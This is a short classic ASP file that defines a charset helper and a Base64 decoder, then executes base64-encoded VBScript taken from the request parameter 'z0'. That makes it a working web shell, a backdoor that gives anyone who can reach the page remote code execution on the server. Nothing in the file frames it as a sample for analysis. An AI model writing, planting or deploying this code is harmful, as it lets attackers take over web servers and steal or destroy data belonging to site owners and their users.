<%

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    
    ' If Response.CharSet is empty, map it based on Session.CodePage
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8" ' Default safe fallback
        End Select
    End If
    
    GetCurrentCharset = charset
End Function

Function Base64Decode(str)
    Dim xml, node, stream

    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = str

    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = GetCurrentCharset()

    Base64Decode = stream.ReadText

    stream.Close
    Set stream = Nothing
    Set node = Nothing
    Set xml = Nothing
End Function

Execute Base64Decode(Request("z0"))

%>